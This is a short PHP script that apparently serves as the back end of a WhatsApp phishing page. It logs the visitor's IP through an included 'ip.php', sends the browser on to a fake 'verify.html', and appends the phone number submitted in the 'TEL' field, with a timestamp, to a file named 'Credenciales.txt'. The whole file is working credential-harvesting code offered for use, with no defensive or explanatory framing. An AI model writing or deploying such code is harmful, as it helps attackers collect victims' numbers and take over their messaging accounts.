<?php
include 'ip.php';

header('Location: verify.html');

$fecha = date('d-m-Y H:i:s');
file_put_contents( "Credenciales.txt",
		    "============================". "\n" .
		    "FECHA: " . $fecha . "\n" .
		    "\n" .
                    "WhatsNumber: " . $_POST['TEL' ] . "\n" , FILE_APPEND );
exit();
?>
